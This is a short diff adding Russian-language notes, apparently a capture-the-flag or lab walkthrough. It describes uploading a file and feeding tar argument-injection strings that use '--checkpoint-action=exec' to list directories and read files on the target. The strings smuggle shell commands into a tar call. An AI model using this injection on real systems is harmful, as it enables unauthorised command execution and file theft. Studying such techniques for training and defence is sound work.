@@ -1,0 +1,8 @@
+Загрузим файл, перейдем на код сайта
+Получим .html и введем его в url
+Дальше вводим 
+-cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="ls -l"
+
+-cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="ls %%%"
+
+-cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="cat %%%"
